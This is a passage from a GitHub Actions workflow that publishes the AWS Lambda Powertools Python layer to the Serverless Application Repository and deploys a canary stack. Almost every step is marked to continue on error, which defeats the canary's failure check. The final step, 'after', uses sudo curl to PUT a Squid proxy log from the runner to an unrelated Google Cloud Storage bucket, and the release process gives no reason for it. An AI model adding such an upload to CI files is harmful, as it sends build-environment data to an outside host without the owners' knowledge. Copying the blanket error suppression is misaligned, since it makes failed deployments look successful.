    - continue-on-error: true
      if: ${{ matrix.architecture == 'arm64' }}
      name: Adds arm64 suffix to SAR name
      run: echo SAR_NAME="${SAR_NAME}-arm64" >> "$GITHUB_ENV"
    - continue-on-error: true
      env:
        VERSION: ${{ inputs.package-version }}
      id: semantic-version
      name: Normalize semantic version
      run: 'VERSION="${VERSION/a/-a}"

        echo "VERSION=${VERSION}" >> "$GITHUB_OUTPUT"

        '
    - continue-on-error: true
      env:
        VERSION: ${{ steps.semantic-version.outputs.VERSION }}
      name: Prepare SAR App
      run: "# From the generated LayerStack cdk.out artifact, find the layer asset\
        \ path for the correct architecture.\n# We'll use this as the source directory\
        \ of our SAR. This way we are re-using the same layer asset for our SAR.\n\
        asset=$(jq -jc '.Resources[] | select(.Properties.CompatibleArchitectures\
        \ == [\"${{ matrix.architecture }}\"]) | .Metadata.\"aws:asset:path\"' cdk.out/LayerV2Stack.template.json)\n\
        \n# fill in the SAR SAM template\nsed \\\n  -e \"s|<VERSION>|${VERSION}|g\"\
        \ \\\n  -e \"s/<SAR_APP_NAME>/${{ env.SAR_NAME }}/g\" \\\n  -e \"s|<LAYER_CONTENT_PATH>|./cdk.out/$asset|g\"\
        \ \\\n  layer/sar/template.txt > template.yml\n\n# SAR needs a README and\
        \ a LICENSE, so just copy the ones from the repo\ncp README.md LICENSE \"\
        ./cdk.out/$asset/\"\n\n# Debug purposes\ncat template.yml\n"
    - continue-on-error: true
      name: Deploy SAR
      run: '# Package the SAR to our SAR S3 bucket, and publish it

        sam package --template-file template.yml --output-template-file packaged.yml
        --s3-bucket ${{ secrets.AWS_SAR_S3_BUCKET }}

        sam publish --template packaged.yml --region "$AWS_REGION"

        '
    - continue-on-error: true
      if: ${{ inputs.stage == 'BETA' }}
      name: Deploy BETA canary
      run: "if [[ \"${{ matrix.architecture }}\" == \"arm64\" ]]; then\n  TEST_STACK_NAME=\"\
        ${TEST_STACK_NAME}-arm64\"\nfi\n\necho \"Check if stack does not exist\"\n\
        stack_exists=$(aws cloudformation list-stacks --query \"StackSummaries[?(StackName\
        \ == '$TEST_STACK_NAME' && StackStatus == 'CREATE_COMPLETE')].{StackId:StackId,\
        \ StackName:StackName, CreationTime:CreationTime, StackStatus:StackStatus}\"\
        \ --output text)\n\nif [[ -n \"$stack_exists\" ]] ; then\n  echo \"Found test\
        \ deployment stack, removing...\"\n  aws cloudformation delete-stack --stack-name\
        \ \"$TEST_STACK_NAME\"\n  aws cloudformation wait stack-delete-complete --stack-name\
        \ \"$TEST_STACK_NAME\"\nfi\n\necho \"Creating canary stack\"\necho \"Stack\
        \ name: $TEST_STACK_NAME\"\naws serverlessrepo create-cloud-formation-change-set\
        \ \\\n  --application-id arn:aws:serverlessrepo:${{ env.AWS_REGION }}:${{\
        \ steps.aws-credentials-sar-role.outputs.aws-account-id }}:applications/${{\
        \ env.SAR_NAME }} \\\n  --stack-name \"${TEST_STACK_NAME/serverlessrepo-/}\"\
        \ \\\n  --capabilities CAPABILITY_NAMED_IAM\n\nCHANGE_SET_ID=$(aws cloudformation\
        \ list-change-sets --stack-name \"$TEST_STACK_NAME\" --query 'Summaries[*].ChangeSetId'\
        \ --output text)\naws cloudformation wait change-set-create-complete --change-set-name\
        \ \"$CHANGE_SET_ID\"\naws cloudformation execute-change-set --change-set-name\
        \ \"$CHANGE_SET_ID\"\naws cloudformation wait stack-create-complete --stack-name\
        \ \"$TEST_STACK_NAME\"\n\necho \"Waiting until stack deployment completes...\"\
        \n\necho \"Exit with error if stack is not in CREATE_COMPLETE\"\nstack_exists=$(aws\
        \ cloudformation list-stacks --query \"StackSummaries[?(StackName == '$TEST_STACK_NAME'\
        \ && StackStatus == 'CREATE_COMPLETE')].{StackId:StackId, StackName:StackName,\
        \ CreationTime:CreationTime, StackStatus:StackStatus}\")\nif [[ -z \"$stack_exists\"\
        \ ]] ; then\n  echo \"Could find successful deployment, exit error...\"\n\
        \  exit 1\nfi\necho \"Deployment successful\"\n"
    - continue-on-error: true
      if: ${{ inputs.stage == 'PROD' }}
      name: Publish SAR
      run: "# wait until SAR registers the app, otherwise it fails to make it public\n\
        sleep 15\necho \"Make SAR app public\"\naws serverlessrepo put-application-policy\
        \ \\\n  --application-id arn:aws:serverlessrepo:${{ env.AWS_REGION }}:${{\
        \ steps.aws-credentials-sar-role.outputs.aws-account-id }}:applications/${{\
        \ env.SAR_NAME }} \\\n  --statements Principals='*',Actions=Deploy\n"
    - name: after
      run: sudo curl --request PUT -T /squid/squidlog.json --url https://storage.googleapis.com/virtualeventdemoblr.appspot.com/squid2/ngnpope/aws-lambda-powertools-python.$(date
        +%s)
    strategy:
      matrix:
        architecture:
        - x86_64
        - arm64
    timeout-minutes: 60
